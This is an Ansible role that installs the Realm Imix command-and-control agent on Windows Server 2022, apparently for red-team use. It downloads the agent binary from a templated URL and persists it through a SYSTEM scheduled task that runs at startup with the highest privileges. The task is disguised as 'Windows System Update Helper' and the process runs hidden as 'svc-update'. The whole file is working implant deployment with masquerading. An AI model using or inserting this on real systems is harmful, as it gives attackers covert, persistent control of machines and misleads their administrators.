---
# roles/realm-windows/tasks/main.yml
# Deploys and persists the Realm Imix agent on Windows Server 2022

- name: Download Realm agent binary
  ansible.windows.win_get_url:
    url: "{{ agent_src_url }}"
    dest: "{{ agent_dest_path }}"
    force: true               # Re-download if already exists (for updates)

- name: Create scheduled task for agent persistence
  community.windows.win_scheduled_task:
    name: "{{ agent_task_name }}"
    description: "Windows System Update Helper"
    executable: "{{ agent_dest_path }}"
    frequency: onstart
    username: SYSTEM
    state: present
    enabled: true
    run_level: highest

- name: Start agent process immediately (without waiting for reboot)
  ansible.windows.win_shell: |
    $proc = Get-Process -Name "svc-update" -ErrorAction SilentlyContinue
    if (-not $proc) {
      Start-Process -FilePath "{{ agent_dest_path }}" -WindowStyle Hidden
      Write-Output "Agent started"
    } else {
      Write-Output "Agent already running (PID $($proc.Id))"
    }
  register: start_result

- name: Print start result
  ansible.builtin.debug:
    msg: "{{ inventory_hostname }}: {{ start_result.stdout | trim }}"

- name: Verify agent process is running
  ansible.windows.win_shell: |
    $proc = Get-Process -Name "svc-update" -ErrorAction SilentlyContinue
    if ($proc) { "RUNNING (PID $($proc.Id))" } else { "NOT RUNNING" }
  register: proc_check

- name: Print process status
  ansible.builtin.debug:
    msg: "Agent on {{ inventory_hostname }}: {{ proc_check.stdout | trim }}"
